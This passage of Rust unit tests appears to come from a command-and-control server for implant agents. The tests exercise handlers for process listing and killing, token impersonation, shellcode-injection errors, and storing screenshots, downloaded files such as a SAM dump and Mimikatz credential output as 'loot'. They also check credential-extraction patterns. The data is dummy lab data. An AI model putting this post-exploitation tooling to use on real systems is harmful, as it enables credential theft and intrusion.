    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher =
            CommandDispatcher::with_builtin_handlers(registry, events, database, sockets, None);

        let mut payload = Vec::new();
        add_u32(&mut payload, 0);
        add_utf16(&mut payload, "explorer.exe");
        add_u32(&mut payload, 1337);
        add_u32(&mut payload, 0);
        add_u32(&mut payload, 512);
        add_u32(&mut payload, 1);
        add_u32(&mut payload, 17);
        add_utf16(&mut payload, "LAB\\operator");

        let response = dispatcher
            .dispatch(0xDEAD_BEEF, u32::from(DemonCommand::CommandProcList), 0x2A, &payload)
            .await?;
        assert_eq!(response, None);

        let event =
            receiver.recv().await.ok_or_else(|| "agent response event missing".to_owned())?;
        let OperatorMessage::AgentResponse(message) = event else {
            panic!("expected agent response event");
        };
        assert_eq!(message.info.demon_id, "DEADBEEF");
        assert_eq!(message.info.command_id, u32::from(DemonCommand::CommandProcList).to_string());
        assert!(message.info.output.contains("explorer.exe"));
        assert_eq!(
            message.info.extra.get("Message"),
            Some(&Value::String("Process List:".to_owned()))
        );
        let rows = message
            .info
            .extra
            .get("ProcessListRows")
            .and_then(Value::as_array)
            .ok_or_else(|| "structured process rows missing".to_owned())?;
        assert_eq!(rows.len(), 1);
        assert_eq!(rows[0].get("PID"), Some(&Value::from(1337)));
        assert_eq!(rows[0].get("Name"), Some(&Value::String("explorer.exe".to_owned())));
        Ok(())
    }

    #[tokio::test]
    async fn builtin_process_kill_and_token_handlers_broadcast_agent_responses()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher =
            CommandDispatcher::with_builtin_handlers(registry, events, database, sockets, None);

        let kill_payload = [
            u32::from(DemonProcessCommand::Kill).to_le_bytes(),
            1_u32.to_le_bytes(),
            4040_u32.to_le_bytes(),
        ]
        .concat();
        dispatcher
            .dispatch(0xAABB_CCDD, u32::from(DemonCommand::CommandProc), 7, &kill_payload)
            .await?;

        let event = receiver.recv().await.ok_or_else(|| "kill response missing".to_owned())?;
        let OperatorMessage::AgentResponse(message) = event else {
            panic!("expected agent response event");
        };
        assert_eq!(
            message.info.extra.get("Message"),
            Some(&Value::String("Successfully killed process: 4040".to_owned()))
        );

        let token_payload =
            [u32::from(DemonTokenCommand::Impersonate).to_le_bytes(), 1_u32.to_le_bytes()].concat();
        let mut token_payload = token_payload;
        add_bytes(&mut token_payload, b"LAB\\svc");
        dispatcher
            .dispatch(0xAABB_CCDD, u32::from(DemonCommand::CommandToken), 8, &token_payload)
            .await?;

        let event = receiver.recv().await.ok_or_else(|| "token response missing".to_owned())?;
        let OperatorMessage::AgentResponse(message) = event else {
            panic!("expected agent response event");
        };
        assert_eq!(
            message.info.extra.get("Message"),
            Some(&Value::String("Successfully impersonated LAB\\svc".to_owned()))
        );
        Ok(())
    }

    #[tokio::test]
    async fn builtin_shellcode_handler_broadcasts_agent_response()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher =
            CommandDispatcher::with_builtin_handlers(registry, events, database, sockets, None);

        dispatcher
            .dispatch(
                0x0102_0304,
                u32::from(DemonCommand::CommandInjectShellcode),
                9,
                &u32::from(DemonInjectError::ProcessArchMismatch).to_le_bytes(),
            )
            .await?;

        let event = receiver.recv().await.ok_or_else(|| "shellcode response missing".to_owned())?;
        let OperatorMessage::AgentResponse(message) = event else {
            panic!("expected agent response event");
        };
        assert_eq!(
            message.info.extra.get("Message"),
            Some(&Value::String("Process architecture mismatch".to_owned()))
        );
        assert_eq!(message.info.extra.get("Type"), Some(&Value::String("Error".to_owned())));
        Ok(())
    }

    #[tokio::test]
    async fn builtin_command_output_handler_captures_credentials_and_broadcasts_loot()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        registry
            .insert(sample_agent_info(
                0xABCD_EE01,
                [0x11; AGENT_KEY_LENGTH],
                [0x22; AGENT_IV_LENGTH],
            ))
            .await?;
        registry
            .enqueue_job(
                0xABCD_EE01,
                Job {
                    command: u32::from(DemonCommand::CommandOutput),
                    request_id: 0x66,
                    payload: Vec::new(),
                    command_line: "sekurlsa::logonpasswords".to_owned(),
                    task_id: "66".to_owned(),
                    created_at: "2026-03-10T10:00:00Z".to_owned(),
                    operator: "operator".to_owned(),
                },
            )
            .await?;
        let dispatcher = CommandDispatcher::with_builtin_handlers(
            registry,
            events,
            database.clone(),
            sockets,
            None,
        );

        let mut payload = Vec::new();
        add_bytes(&mut payload, b"Username : alice\nPassword : Sup3rSecret!\nDomain   : LAB");
        dispatcher
            .dispatch(0xABCD_EE01, u32::from(DemonCommand::CommandOutput), 0x66, &payload)
            .await?;

        let first = receiver.recv().await.ok_or("missing output event")?;
        let second = receiver.recv().await.ok_or("missing loot event")?;
        let third = receiver.recv().await.ok_or("missing credential event")?;

        let OperatorMessage::AgentResponse(output_message) = first else {
            panic!("expected command output response");
        };
        assert_eq!(output_message.info.command_line.as_deref(), Some("sekurlsa::logonpasswords"));
        assert_eq!(
            output_message.info.extra.get("Message"),
            Some(&Value::String("Received Output [55 bytes]:".to_owned()))
        );
        assert_eq!(
            output_message.info.extra.get("RequestID"),
            Some(&Value::String("66".to_owned()))
        );
        assert_eq!(output_message.info.extra.get("TaskID"), Some(&Value::String("66".to_owned())));

        let OperatorMessage::AgentResponse(loot_message) = second else {
            panic!("expected loot-new response");
        };
        assert_eq!(
            loot_message.info.extra.get("MiscType"),
            Some(&Value::String("loot-new".to_owned()))
        );
        assert_eq!(
            loot_message.info.extra.get("Operator"),
            Some(&Value::String("operator".to_owned()))
        );

        let OperatorMessage::CredentialsAdd(credentials) = third else {
            panic!("expected credentials event");
        };
        assert_eq!(
            credentials.info.fields.get("CommandLine"),
            Some(&Value::String("sekurlsa::logonpasswords".to_owned()))
        );

        let loot = database.loot().list_for_agent(0xABCD_EE01).await?;
        assert_eq!(loot.len(), 1);
        assert!(loot.iter().all(|entry| entry.kind == "credential"));
        assert!(loot.iter().any(|entry| {
            entry.data.as_deref()
                == Some(b"Username : alice\nPassword : Sup3rSecret!\nDomain   : LAB".as_slice())
        }));
        assert!(loot.iter().all(|entry| {
            entry.metadata.as_ref().and_then(|value| value.get("operator"))
                == Some(&Value::String("operator".to_owned()))
        }));
        let responses = database.agent_responses().list_for_agent(0xABCD_EE01).await?;
        assert_eq!(responses.len(), 1);
        assert_eq!(responses[0].request_id, 0x66);
        assert_eq!(responses[0].response_type, "Good");
        assert_eq!(responses[0].command_line.as_deref(), Some("sekurlsa::logonpasswords"));
        assert_eq!(responses[0].task_id.as_deref(), Some("66"));
        assert_eq!(responses[0].operator.as_deref(), Some("operator"));
        assert_eq!(
            responses[0].output,
            "Username : alice\nPassword : Sup3rSecret!\nDomain   : LAB"
        );
        Ok(())
    }

    #[test]
    fn looks_like_credential_line_matches_expected_patterns() {
        let cases = [
            ("Password : Sup3rSecret!", true),
            ("username=alice", true),
            ("NTLM:0123456789ABCDEF0123456789ABCDEF", true),
            (
                "Administrator:500:AAD3B435B51404EEAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4:::",
                false,
            ),
            ("status: password reset not required", false),
            ("operator message: secret rotation completed", false),
            ("https://example.test/password/reset", false),
            ("C:\\Windows\\Temp\\password.txt", false),
        ];

        for (line, expected) in cases {
            assert_eq!(
                looks_like_credential_line(line),
                expected,
                "unexpected classification for {line:?}"
            );
        }
    }

    #[test]
    fn looks_like_inline_secret_handles_expected_and_edge_cases() {
        let cases = [
            ("alice@example.com:Sup3rSecret!", true),
            ("LAB\\alice:Sup3rSecret!", true),
            ("operator:Password123", true),
            ("https://alice:Password123@example.test", false),
            ("status: password rotation completed", false),
            ("C:\\Temp\\secret.txt", false),
            ("LAB\\alice:short", true),
        ];

        for (line, expected) in cases {
            assert_eq!(
                looks_like_inline_secret(line),
                expected,
                "unexpected inline-secret classification for {line:?}"
            );
        }
    }

    #[test]
    fn looks_like_pwdump_hash_matches_pwdump_format_only() {
        let cases = [
            (
                "Administrator:500:AAD3B435B51404EEAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4:::",
                true,
            ),
            (
                "alice:1001:0123456789ABCDEFFEDCBA9876543210:00112233445566778899AABBCCDDEEFF:::",
                true,
            ),
            ("NTLM:0123456789ABCDEF0123456789ABCDEF", false),
            ("Administrator:500:nothex:32ED87BDB5FDC5E9CBA88547376818D4:::", false),
            ("status: hash sync completed", false),
        ];

        for (line, expected) in cases {
            assert_eq!(
                looks_like_pwdump_hash(line),
                expected,
                "unexpected pwdump classification for {line:?}"
            );
        }
    }

    #[test]
    fn extract_credentials_captures_blocks_inline_secrets_and_hashes() {
        let output = [
            "status: password reset not required",
            "message: domain join succeeded",
            "Username : alice",
            "Password : Sup3rSecret!",
            "Domain   : LAB",
            "",
            "alice@example.com:InlinePass123",
            "C:\\Windows\\Temp\\password.txt",
            "https://example.test/password/reset",
            "Administrator:500:AAD3B435B51404EEAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4:::",
            "operator message: secret rotation completed",
        ]
        .join("\n");

        let captures = extract_credentials(&output);
        let actual = captures
            .iter()
            .map(|capture| (capture.label.as_str(), capture.pattern, capture.content.as_str()))
            .collect::<Vec<_>>();

        assert_eq!(
            actual,
            vec![
                (
                    "credential-block",
                    "keyword-block",
                    "Username : alice\nPassword : Sup3rSecret!\nDomain   : LAB",
                ),
                ("inline-credential", "inline-secret", "alice@example.com:InlinePass123",),
                (
                    "password-hash",
                    "pwdump-hash",
                    "Administrator:500:AAD3B435B51404EEAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4:::",
                ),
            ]
        );
    }

    #[tokio::test]
    async fn builtin_beacon_output_and_error_callbacks_persist_response_history()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        registry
            .insert(sample_agent_info(
                0xABCD_EE02,
                [0x11; AGENT_KEY_LENGTH],
                [0x22; AGENT_IV_LENGTH],
            ))
            .await?;
        registry
            .enqueue_job(
                0xABCD_EE02,
                Job {
                    command: u32::from(DemonCommand::BeaconOutput),
                    request_id: 0x67,
                    payload: Vec::new(),
                    command_line: "inline-execute seatbelt".to_owned(),
                    task_id: "67".to_owned(),
                    created_at: "2026-03-10T10:05:00Z".to_owned(),
                    operator: "operator".to_owned(),
                },
            )
            .await?;
        let dispatcher = CommandDispatcher::with_builtin_handlers(
            registry,
            events,
            database.clone(),
            sockets,
            None,
        );

        let mut output = Vec::new();
        add_u32(&mut output, u32::from(DemonCallback::Output));
        add_bytes(&mut output, b"Seatbelt complete");
        dispatcher
            .dispatch(0xABCD_EE02, u32::from(DemonCommand::BeaconOutput), 0x67, &output)
            .await?;

        let mut error = Vec::new();
        add_u32(&mut error, u32::from(DemonCallback::ErrorMessage));
        add_bytes(&mut error, b"access denied");
        dispatcher
            .dispatch(0xABCD_EE02, u32::from(DemonCommand::BeaconOutput), 0x67, &error)
            .await?;

        let first = receiver.recv().await.ok_or("missing beacon output event")?;
        let second = receiver.recv().await.ok_or("missing beacon error event")?;

        let OperatorMessage::AgentResponse(first_message) = first else {
            panic!("expected beacon output response");
        };
        assert_eq!(first_message.info.command_line.as_deref(), Some("inline-execute seatbelt"));
        assert_eq!(first_message.info.extra.get("Type"), Some(&Value::String("Good".to_owned())));

        let OperatorMessage::AgentResponse(second_message) = second else {
            panic!("expected beacon error response");
        };
        assert_eq!(second_message.info.extra.get("Type"), Some(&Value::String("Error".to_owned())));
        assert_eq!(second_message.info.extra.get("TaskID"), Some(&Value::String("67".to_owned())));

        let responses = database.agent_responses().list_for_agent(0xABCD_EE02).await?;
        assert_eq!(responses.len(), 2);
        assert_eq!(responses[0].output, "Seatbelt complete");
        assert_eq!(responses[0].response_type, "Good");
        assert_eq!(responses[1].output, "access denied");
        assert_eq!(responses[1].response_type, "Error");
        assert!(responses.iter().all(|response| response.request_id == 0x67));
        assert!(responses.iter().all(|response| {
            response.command_line.as_deref() == Some("inline-execute seatbelt")
        }));
        Ok(())
    }

    #[tokio::test]
    async fn builtin_screenshot_handler_persists_loot_and_broadcasts_misc_fields()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        registry
            .insert(sample_agent_info(
                0xABCD_EF01,
                [0x11; AGENT_KEY_LENGTH],
                [0x22; AGENT_IV_LENGTH],
            ))
            .await?;
        let dispatcher = CommandDispatcher::with_builtin_handlers(
            registry,
            events,
            database.clone(),
            sockets,
            None,
        );

        let png = vec![0x89, b'P', b'N', b'G'];
        let payload = [1_u32.to_le_bytes().to_vec(), {
            let mut data = Vec::new();
            add_bytes(&mut data, &png);
            data
        }]
        .concat();

        dispatcher
            .dispatch(0xABCD_EF01, u32::from(DemonCommand::CommandScreenshot), 0x44, &payload)
            .await?;

        let loot = database.loot().list_for_agent(0xABCD_EF01).await?;
        assert_eq!(loot.len(), 1);
        assert_eq!(loot[0].kind, "screenshot");
        assert_eq!(loot[0].data.as_deref(), Some(png.as_slice()));

        let loot_event = receiver.recv().await.ok_or_else(|| "loot event missing".to_owned())?;
        let event =
            receiver.recv().await.ok_or_else(|| "screenshot response missing".to_owned())?;
        let OperatorMessage::AgentResponse(loot_message) = loot_event else {
            panic!("expected screenshot loot event");
        };
        assert_eq!(
            loot_message.info.extra.get("MiscType"),
            Some(&Value::String("loot-new".to_owned()))
        );
        let OperatorMessage::AgentResponse(message) = event else {
            panic!("expected screenshot agent response event");
        };
        assert_eq!(
            message.info.extra.get("MiscType"),
            Some(&Value::String("screenshot".to_owned()))
        );
        assert_eq!(
            message.info.extra.get("MiscData"),
            Some(&Value::String(BASE64_STANDARD.encode(&png)))
        );
        Ok(())
    }

    #[tokio::test]
    async fn builtin_filesystem_download_handler_persists_loot_and_progress()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        registry
            .insert(sample_agent_info(
                0xABCD_EF11,
                [0x11; AGENT_KEY_LENGTH],
                [0x22; AGENT_IV_LENGTH],
            ))
            .await?;
        let dispatcher = CommandDispatcher::with_builtin_handlers(
            registry,
            events,
            database.clone(),
            sockets,
            None,
        );

        let file_id = 0x33_u32;
        let remote_path = "C:\\Temp\\sam.dump";
        let content = b"secret-bytes";

        let mut open = Vec::new();
        add_u32(&mut open, u32::from(DemonFilesystemCommand::Download));
        add_u32(&mut open, 0);
        add_u32(&mut open, file_id);
        add_u64(&mut open, u64::try_from(content.len())?);
        add_utf16(&mut open, remote_path);
        dispatcher.dispatch(0xABCD_EF11, u32::from(DemonCommand::CommandFs), 0x99, &open).await?;

        let mut write = Vec::new();
        add_u32(&mut write, u32::from(DemonFilesystemCommand::Download));
        add_u32(&mut write, 1);
        add_u32(&mut write, file_id);
        add_bytes(&mut write, content);
        dispatcher.dispatch(0xABCD_EF11, u32::from(DemonCommand::CommandFs), 0x99, &write).await?;

        let mut close = Vec::new();
        add_u32(&mut close, u32::from(DemonFilesystemCommand::Download));
        add_u32(&mut close, 2);
        add_u32(&mut close, file_id);
        add_u32(&mut close, 0);
        dispatcher.dispatch(0xABCD_EF11, u32::from(DemonCommand::CommandFs), 0x99, &close).await?;

        let first = receiver.recv().await.ok_or("missing open event")?;
        let second = receiver.recv().await.ok_or("missing progress event")?;
        let third = receiver.recv().await.ok_or("missing loot event")?;
        let fourth = receiver.recv().await.ok_or("missing completion event")?;

        let OperatorMessage::AgentResponse(open_message) = first else {
            panic!("expected download open response");
        };
        assert_eq!(
            open_message.info.extra.get("MiscType"),
            Some(&Value::String("download-progress".to_owned()))
        );

        let OperatorMessage::AgentResponse(progress_message) = second else {
            panic!("expected download progress response");
        };
        assert_eq!(
            progress_message.info.extra.get("CurrentSize"),
            Some(&Value::String(content.len().to_string()))
        );

        let OperatorMessage::AgentResponse(loot_message) = third else {
            panic!("expected loot event");
        };
        assert_eq!(
            loot_message.info.extra.get("MiscType"),
            Some(&Value::String("loot-new".to_owned()))
        );

        let OperatorMessage::AgentResponse(done_message) = fourth else {
            panic!("expected download completion response");
        };
        assert_eq!(
            done_message.info.extra.get("MiscType"),
            Some(&Value::String("download".to_owned()))
        );
        assert_eq!(
            done_message.info.extra.get("MiscData"),
            Some(&Value::String(BASE64_STANDARD.encode(content)))
        );

        let loot = database.loot().list_for_agent(0xABCD_EF11).await?;
        assert_eq!(loot.len(), 1);
        assert_eq!(loot[0].kind, "download");
        assert_eq!(loot[0].file_path.as_deref(), Some(remote_path));
        assert_eq!(loot[0].data.as_deref(), Some(content.as_slice()));
        Ok(())
    }

    #[tokio::test]
    async fn builtin_filesystem_download_handler_accumulates_multi_chunk_downloads_until_close()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        registry
            .insert(sample_agent_info(
                0xABCD_EF12,
                [0x11; AGENT_KEY_LENGTH],
                [0x22; AGENT_IV_LENGTH],
            ))
            .await?;
        let dispatcher = CommandDispatcher::with_builtin_handlers(
            registry,
            events,
            database.clone(),
            sockets,
            None,
        );

        let file_id = 0x34_u32;
        let remote_path = "C:\\Temp\\partial.dump";

        dispatcher
            .dispatch(
                0xABCD_EF12,
                u32::from(DemonCommand::CommandFs),
                0x9A,
                &filesystem_download_open(file_id, 64, remote_path),
            )
            .await?;
        dispatcher
            .dispatch(
                0xABCD_EF12,
                u32::from(DemonCommand::CommandFs),
                0x9A,
                &filesystem_download_write(file_id, b"secret-"),
            )
            .await?;
        dispatcher
            .dispatch(
                0xABCD_EF12,
                u32::from(DemonCommand::CommandFs),
                0x9A,
                &filesystem_download_write(file_id, b"bytes"),
            )
            .await?;

        assert!(database.loot().list_for_agent(0xABCD_EF12).await?.is_empty());

        let _ = receiver.recv().await.ok_or("missing filesystem open event")?;
        let progress_one =
            receiver.recv().await.ok_or("missing first filesystem progress event")?;
        let progress_two =
            receiver.recv().await.ok_or("missing second filesystem progress event")?;

        let OperatorMessage::AgentResponse(progress_one) = progress_one else {
            panic!("expected first filesystem progress response");
        };
        assert_eq!(
            progress_one.info.extra.get("CurrentSize"),
            Some(&Value::String("7".to_owned()))
        );
        assert_eq!(
            progress_one.info.extra.get("ExpectedSize"),
            Some(&Value::String("64".to_owned()))
        );

        let OperatorMessage::AgentResponse(progress_two) = progress_two else {
            panic!("expected second filesystem progress response");
        };
        assert_eq!(
            progress_two.info.extra.get("CurrentSize"),
            Some(&Value::String("12".to_owned()))
        );
        assert_eq!(
            progress_two.info.extra.get("ExpectedSize"),
            Some(&Value::String("64".to_owned()))
        );
        let active = dispatcher.downloads.active_for_agent(0xABCD_EF12).await;
        assert_eq!(active.len(), 1);
        assert_eq!(active[0].0, file_id);
        assert_eq!(active[0].1.request_id, 0x9A);
        assert_eq!(active[0].1.remote_path, remote_path);
        assert_eq!(active[0].1.expected_size, 64);
        assert_eq!(active[0].1.data, b"secret-bytes");
        assert!(
            !active[0].1.started_at.is_empty(),
            "active filesystem download should preserve its start timestamp"
        );
        assert!(
            timeout(Duration::from_millis(50), receiver.recv()).await.is_err(),
            "filesystem download should remain incomplete until close"
        );

        dispatcher
            .dispatch(
                0xABCD_EF12,
                u32::from(DemonCommand::CommandFs),
                0x9A,
                &filesystem_download_close(file_id, 0),
            )
            .await?;

        let _ = receiver.recv().await.ok_or("missing filesystem loot event")?;
        let completion = receiver.recv().await.ok_or("missing filesystem completion event")?;
        let OperatorMessage::AgentResponse(completion) = completion else {
            panic!("expected filesystem completion response");
        };
        assert_eq!(
            completion.info.extra.get("MiscData"),
            Some(&Value::String(BASE64_STANDARD.encode(b"secret-bytes")))
        );

        let loot = database.loot().list_for_agent(0xABCD_EF12).await?;
        assert_eq!(loot.len(), 1);
        assert_eq!(loot[0].data.as_deref(), Some(b"secret-bytes".as_slice()));
        assert_eq!(loot[0].file_path.as_deref(), Some(remote_path));
        Ok(())
    }

    #[tokio::test]
    async fn builtin_filesystem_download_handler_rejects_writes_without_open()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        registry
            .insert(sample_agent_info(
                0xABCD_EF13,
                [0x11; AGENT_KEY_LENGTH],
                [0x22; AGENT_IV_LENGTH],
            ))
            .await?;
        let dispatcher = CommandDispatcher::with_builtin_handlers(
            registry,
            events,
            database.clone(),
            sockets,
            None,
        );

        let error = dispatcher
            .dispatch(
                0xABCD_EF13,
                u32::from(DemonCommand::CommandFs),
                0x9B,
                &filesystem_download_write(0x35, b"orphan"),
            )
            .await
            .expect_err("filesystem download write without open should fail");
        assert!(matches!(
            error,
            CommandDispatchError::InvalidCallbackPayload {
                command_id,
                message,
            } if command_id == u32::from(DemonCommand::BeaconOutput)
                && message == "download 0x00000035 was not opened"
        ));
        assert!(
            timeout(Duration::from_millis(50), receiver.recv()).await.is_err(),
            "unexpected events for rejected filesystem download write"
        );
        assert!(database.loot().list_for_agent(0xABCD_EF13).await?.is_empty());
        Ok(())
    }

    #[tokio::test]
    async fn download_tracker_accumulates_multi_chunk_data_until_finish() {
        let tracker = DownloadTracker::new(64);
        tracker
            .start(
                0xABCD_EF51,
                0x41,
                DownloadState {
                    request_id: 0x71,
                    remote_path: "C:\\Temp\\multi.bin".to_owned(),
                    expected_size: 32,
                    data: Vec::new(),
                    started_at: "2026-03-11T09:00:00Z".to_owned(),
                },
            )
            .await;

        let first =
            tracker.append(0xABCD_EF51, 0x41, b"abc").await.expect("first chunk should append");
        assert_eq!(first.data, b"abc");
        assert_eq!(first.expected_size, 32);

        let second =
            tracker.append(0xABCD_EF51, 0x41, b"def").await.expect("second chunk should append");
        assert_eq!(second.data, b"abcdef");
        assert_eq!(second.expected_size, 32);

        let finished = tracker.finish(0xABCD_EF51, 0x41).await;
        assert_eq!(
            finished,
            Some(DownloadState {
                request_id: 0x71,
                remote_path: "C:\\Temp\\multi.bin".to_owned(),
                expected_size: 32,
                data: b"abcdef".to_vec(),
                started_at: "2026-03-11T09:00:00Z".to_owned(),
            })
        );
        assert_eq!(tracker.finish(0xABCD_EF51, 0x41).await, None);
    }

    #[tokio::test]
    async fn download_tracker_keeps_partial_downloads_active_until_finish() {
        let tracker = DownloadTracker::new(64);
        tracker
            .start(
                0xABCD_EF54,
                0x44,
                DownloadState {
                    request_id: 0x73,
                    remote_path: "C:\\Temp\\pending.bin".to_owned(),
                    expected_size: 32,
                    data: Vec::new(),
                    started_at: "2026-03-11T09:10:00Z".to_owned(),
                },
            )
            .await;

        let partial = tracker
            .append(0xABCD_EF54, 0x44, b"partial")
            .await
            .expect("partial chunk should append");
        assert_eq!(partial.data, b"partial");
        assert_eq!(partial.expected_size, 32);

        let active = tracker.active_for_agent(0xABCD_EF54).await;
        assert_eq!(active.len(), 1);
        assert_eq!(active[0].0, 0x44);
        assert_eq!(active[0].1, partial);

        assert_eq!(tracker.active_for_agent(0xABCD_EF99).await, Vec::new());
        assert_eq!(tracker.finish(0xABCD_EF54, 0x44).await, Some(partial));
    }

    #[tokio::test]
    async fn download_tracker_drain_agent_discards_all_partial_downloads_for_agent() {
        let tracker = DownloadTracker::with_limits(64, 128);

        for (agent_id, file_id, data) in [
            (0xABCD_EF57, 0x70_u32, b"first".as_slice()),
            (0xABCD_EF57, 0x71_u32, b"second".as_slice()),
            (0xABCD_EF58, 0x72_u32, b"third".as_slice()),
        ] {
            tracker
                .start(
                    agent_id,
                    file_id,
                    DownloadState {
                        request_id: file_id,
                        remote_path: format!("C:\\Temp\\{file_id:08x}.bin"),
                        expected_size: 32,
                        data: Vec::new(),
                        started_at: "2026-03-11T09:25:00Z".to_owned(),
                    },
                )
                .await;
            let state = tracker.append(agent_id, file_id, data).await.expect("chunk should append");
            assert_eq!(state.data, data);
        }

        assert_eq!(tracker.buffered_bytes().await, 16);
        assert_eq!(tracker.drain_agent(0xABCD_EF57).await, 2);
        assert!(tracker.active_for_agent(0xABCD_EF57).await.is_empty());
        assert_eq!(tracker.buffered_bytes().await, 5);
        assert_eq!(tracker.active_for_agent(0xABCD_EF58).await.len(), 1);
        assert_eq!(tracker.drain_agent(0xABCD_EF57).await, 0);
    }

    #[tokio::test]
    async fn download_tracker_rejects_chunks_for_unknown_downloads() {
        let tracker = DownloadTracker::new(64);

        let error = tracker
            .append(0xABCD_EF52, 0x42, b"orphan")
            .await
            .expect_err("append without start should fail");
        assert!(matches!(
            error,
            CommandDispatchError::InvalidCallbackPayload {
                command_id,
                message,
            } if command_id == u32::from(DemonCommand::BeaconOutput)
                && message == "download 0x00000042 was not opened"
        ));
    }

    #[tokio::test]
    async fn download_tracker_drops_downloads_that_exceed_the_size_cap() {
        let tracker = DownloadTracker::new(4);
        tracker
            .start(
                0xABCD_EF53,
                0x43,
                DownloadState {
                    request_id: 0x72,
                    remote_path: "C:\\Temp\\oversized.bin".to_owned(),
                    expected_size: 16,
                    data: Vec::new(),
                    started_at: "2026-03-11T09:05:00Z".to_owned(),
                },
            )
            .await;

        let partial = tracker
            .append(0xABCD_EF53, 0x43, b"12")
            .await
            .expect("first partial chunk should append");
        assert_eq!(partial.data, b"12");

        let error = tracker
            .append(0xABCD_EF53, 0x43, b"345")
            .await
            .expect_err("downloads above the cap should be dropped");
        assert!(matches!(
            error,
            CommandDispatchError::DownloadTooLarge {
                agent_id: 0xABCD_EF53,
                file_id: 0x43,
                max_download_bytes: 4,
            }
        ));
        assert_eq!(tracker.finish(0xABCD_EF53, 0x43).await, None);
    }

    #[tokio::test]
    async fn download_tracker_limits_total_buffered_bytes_across_partial_downloads() {
        let tracker = DownloadTracker::with_limits(8, 10);

        for file_id in [0x50_u32, 0x51, 0x52] {
            tracker
                .start(
                    0xABCD_EF55,
                    file_id,
                    DownloadState {
                        request_id: 0x80 + file_id,
                        remote_path: format!("C:\\Temp\\{file_id:08x}.bin"),
                        expected_size: 16,
                        data: Vec::new(),
                        started_at: "2026-03-11T09:15:00Z".to_owned(),
                    },
                )
                .await;
        }

        assert_eq!(
            tracker.append(0xABCD_EF55, 0x50, b"abcd").await.expect("first chunk").data,
            b"abcd"
        );
        assert_eq!(
            tracker.append(0xABCD_EF55, 0x51, b"efgh").await.expect("second chunk").data,
            b"efgh"
        );
        assert_eq!(tracker.buffered_bytes().await, 8);

        let error = tracker
            .append(0xABCD_EF55, 0x52, b"ijk")
            .await
            .expect_err("aggregate cap should reject additional concurrent partial data");
        assert!(matches!(
            error,
            CommandDispatchError::DownloadAggregateTooLarge {
                agent_id: 0xABCD_EF55,
                file_id: 0x52,
                max_total_download_bytes: 10,
            }
        ));
        assert_eq!(tracker.buffered_bytes().await, 8);

        let active = tracker.active_for_agent(0xABCD_EF55).await;
        assert_eq!(active.len(), 2);
        assert_eq!(active[0].0, 0x50);
        assert_eq!(active[0].1.data, b"abcd");
        assert_eq!(active[1].0, 0x51);
        assert_eq!(active[1].1.data, b"efgh");
        assert_eq!(tracker.finish(0xABCD_EF55, 0x52).await, None);
    }

    #[tokio::test]
    async fn download_tracker_keeps_idle_partial_downloads_until_finish() {
        let tracker = DownloadTracker::with_limits(16, 12);

        for file_id in [0x60_u32, 0x61] {
            tracker
                .start(
                    0xABCD_EF56,
                    file_id,
                    DownloadState {
                        request_id: 0x90 + file_id,
                        remote_path: format!("C:\\Temp\\idle-{file_id:08x}.bin"),
                        expected_size: 32,
                        data: Vec::new(),
                        started_at: "2026-03-11T09:20:00Z".to_owned(),
                    },
                )
                .await;
        }

        tracker.append(0xABCD_EF56, 0x60, b"12").await.expect("first partial should append");
        tracker.append(0xABCD_EF56, 0x61, b"34").await.expect("second partial should append");
        assert_eq!(tracker.buffered_bytes().await, 4);

        tokio::time::sleep(std::time::Duration::from_millis(5)).await;

        let continued = tracker
            .append(0xABCD_EF56, 0x60, b"56")
            .await
            .expect("idle transfer should still accept more data");
        assert_eq!(continued.data, b"1256");
        assert_eq!(tracker.buffered_bytes().await, 6);

        let active = tracker.active_for_agent(0xABCD_EF56).await;
        assert_eq!(active.len(), 2);
        assert_eq!(active[0].0, 0x60);
        assert_eq!(active[0].1.data, b"1256");
        assert_eq!(active[1].0, 0x61);
        assert_eq!(active[1].1.data, b"34");

        assert_eq!(
            tracker.finish(0xABCD_EF56, 0x60).await,
            Some(DownloadState {
                request_id: 0xF0,
                remote_path: "C:\\Temp\\idle-00000060.bin".to_owned(),
                expected_size: 32,
                data: b"1256".to_vec(),
                started_at: "2026-03-11T09:20:00Z".to_owned(),
            })
        );
